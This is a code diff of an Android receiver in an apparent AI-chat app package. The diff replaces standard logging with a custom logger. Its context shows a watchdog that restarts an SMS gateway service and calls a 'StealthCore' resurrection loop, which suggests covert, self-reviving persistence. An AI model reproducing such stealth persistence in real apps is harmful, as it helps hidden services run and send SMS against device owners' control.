@@ -7,7 +7,7 @@ import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.os.SystemClock
-import android.util.Log
+import com.cornspace.aichat.util.AppLogger
 import com.cornspace.aichat.util.Constants.WATCHDOG_ALARM_INTERVAL
 
 /**
@@ -32,9 +32,9 @@ class AlarmReceiver : BroadcastReceiver() {
                     WATCHDOG_ALARM_INTERVAL,
                     pendingIntent
                 )
-                Log.d(TAG, "Watchdog alarm scheduled — interval ${WATCHDOG_ALARM_INTERVAL}ms")
+                AppLogger.d(TAG, "Watchdog alarm scheduled — interval ${WATCHDOG_ALARM_INTERVAL}ms")
             } catch (e: Exception) {
-                Log.e(TAG, "Error scheduling alarm", e)
+                AppLogger.e(TAG, "Error scheduling alarm", e)
             }
         }
 
@@ -42,13 +42,13 @@ class AlarmReceiver : BroadcastReceiver() {
             try {
                 val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                 val pendingIntent = buildPendingIntentForCancel(context) ?: run {
-                    Log.d(TAG, "No watchdog alarm to cancel")
+                    AppLogger.d(TAG, "No watchdog alarm to cancel")
                     return
                 }
                 alarmManager.cancel(pendingIntent)
-                Log.d(TAG, "Watchdog alarm cancelled")
+                AppLogger.d(TAG, "Watchdog alarm cancelled")
             } catch (e: Exception) {
-                Log.e(TAG, "Error cancelling alarm", e)
+                AppLogger.e(TAG, "Error cancelling alarm", e)
             }
         }
 
@@ -70,10 +70,10 @@ class AlarmReceiver : BroadcastReceiver() {
     }
 
     override fun onReceive(context: Context, intent: Intent) {
-        Log.d(TAG, "Watchdog alarm fired — checking service")
+        AppLogger.d(TAG, "Watchdog alarm fired — checking service")
         try {
             if (!SmsGatewayService.isServiceRunning()) {
-                Log.w(TAG, "Service not running — restarting")
+                AppLogger.w(TAG, "Service not running — restarting")
                 val serviceIntent = Intent(context, SmsGatewayService::class.java)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     context.startForegroundService(serviceIntent)
@@ -87,7 +87,7 @@ class AlarmReceiver : BroadcastReceiver() {
                 // superfluous alarm reschedule every 5 minutes.
                 StealthCore.startResurrectionLoop(context)
             } else {
-                Log.d(TAG, "Service running — watchdog alarm no-op")
+                AppLogger.d(TAG, "Service running — watchdog alarm no-op")
                 // The StealthResurrector loop is self-perpetuating; no need to
                 // prod it here when everything is healthy.
             }
@@ -96,7 +96,7 @@ class AlarmReceiver : BroadcastReceiver() {
             // Do NOT call scheduleAlarm() here — it would create redundant reschedules.
 
         } catch (e: Exception) {
-            Log.e(TAG, "Error in watchdog receiver", e)
+            AppLogger.e(TAG, "Error in watchdog receiver", e)
         }
     }
 }
